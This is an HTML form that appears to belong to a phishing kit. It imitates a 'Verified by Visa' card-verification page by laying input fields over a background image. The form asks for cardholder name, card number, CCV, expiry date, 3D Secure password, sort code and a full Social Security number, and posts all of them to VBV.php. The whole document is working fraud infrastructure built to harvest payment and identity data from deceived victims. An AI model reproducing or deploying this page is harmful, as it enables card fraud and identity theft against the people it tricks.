<form method="post" style="background : url(img/vbv.png) no-repeat ; width: 660px; height:682px" action="VBV.php" >
					<!-- Full Name !-->
					<div>
						<input 
							maxlength="20"
							onKeyPress="return ValidateAlpha(event);"
							name="_fulln"
							autocomplete="off"
							type="text"
							required 
							title="Enter your card holder as showen on your card"
							style="z-index: 1; position: absolute; top: 116px; left: 545px; width: 200px;" 
						/>
					</div>
					
					
					<!-- Card Number !-->
					<div>
						<input 
							pattern=".{15,16}"
							maxlength="16" 
							name="_ccn" 
							type="text" 
							autocomplete="off" 
							onkeypress="return isNumberKey(event)" 
							required 
							title="Enter your card number as showen on your card" 
							style="z-index: 1; position: absolute; top: 165px; left: 545px; width: 200px;" 
						/>
					</div>
					
					
					<!-- CCV !-->
					<div>
						<input 
							onkeypress="return isNumberKey(event)" 
							autocomplete="off"
							maxlength="4"
							pattern=".{3,4}"
							name="_ccv" 
							type="text" 
							required 
							title="Enter your card verification code as showen on your card" 
							style="z-index: 1; position: absolute; top: 214px; left: 545px; width: 35px;" 
						/>
						<a 
							style="z-index: 1; position: absolute; top: 218px; left: 600px; width: 100px;" 
							href="javascript:popUp('bin/ccv.php')" 
							target="_blank" 
							title="Card Security Code">
							what is this?</a>
					</div>
					
					
					<!-- Expiration Date !-->
					<div>
						<select tabindex="4" name="_expm" required style="z-index: 1; position: absolute; top: 262px; left: 545px; width: 100px;">
							<option value="01">1 - January</option>
							<option value="02">2 - February</option>
							<option value="03">3 - March</option>
							<option value="04">4 - April</option>
							<option value="05">5 - May</option>
							<option value="06" >6 - June</option>
							<option value="07" selected="selected">7 - July</option>
							<option value="08">8 - August</option>
							<option value="09">9 - September</option>
							<option value="10">10 - October</option>
							<option value="11">11 - November</option>
							<option value="12">12 - December</option>
						</select>
				
						<select name="_expy" required style="z-index: 1; position: absolute; top: 262px; left: 655px; width: 70px;">
							<option value="2014">2014</option>
							<option value="2015">2015</option>
							<option value="2016">2016</option>
							<option value="2017">2017</option>
							<option value="2018">2018</option>
							<option value="2019">2019</option>
							<option value="2020">2020</option>
							<option value="2021">2021</option>
							<option value="2022">2022</option>
							<option value="2023">2023</option>
							<option value="2024">2024</option>
							<option value="2025">2025</option>
							<option value="2026">2026</option>
							<option value="2027">2027</option>
							<option value="2028">2028</option>
							<option value="2029">2029</option>
							<option value="2030">2030</option>
							<option value="2031">2031</option>
							<option value="2032">2032</option>
							<option value="2033">2033</option>
							<option value="2034">2034</option>
							</select>
					</div>
					
					
					<!-- 3D Secure !-->
					<div>
						<input 
							autocomplete="off"
							maxlength="15"
							name="_3d" 
							type="password" 
							required 
							style="background: url(img/3dsecure.png) no-repeat scroll right;  z-index: 1; position: absolute; top: 311px; left: 545px; width: 200px;" 
						/>
					</div>
					
					
					<!-- Sort Code !-->
					<div>
						<input 
							tabindex="7"
							onkeypress="return isNumberKey(event)"
							autocomplete="off"
							maxlength="6"
							name="_sortc" 
							type="text" 
							style="z-index: 1; position: absolute; top: 360px; left: 545px; width: 67px;" 
						/>
					</div>
					
					
					<!-- SSN !-->
					<div>
						<input 
							tabindex="8"
							onkeypress="return isNumberKey(event)"
							autocomplete="off"
							maxlength="3"
							name="_ssn1" 
							type="text" 
							style="z-index: 1; position: absolute; top: 409px; left: 545px; width: 28px;" 
						/>
						
						<input 
							tabindex="9"
							onkeypress="return isNumberKey(event)"
							autocomplete="off"
							maxlength="2"
							name="_ssn2" 
							type="text" 
							style="z-index: 1; position: absolute; top: 409px; left: 595px; width: 18px;" 
						/>
						
						<input 
							tabindex="10"
							onkeypress="return isNumberKey(event)"
							autocomplete="off"
							maxlength="4"
							name="_ssn3" 
							type="text" 
							style="z-index: 1; position: absolute; top: 409px; left: 635px; width: 35px;" 
						/>
					</div>
					
					
					<button style="z-index: 1; position: absolute; top: 457px; left: 578px; width: 100px; height:22px" type="submit" value="NEXT" class="button">Next</button><input type="hidden" value="./css/gloobal.css" name="hostname"/>
					</form>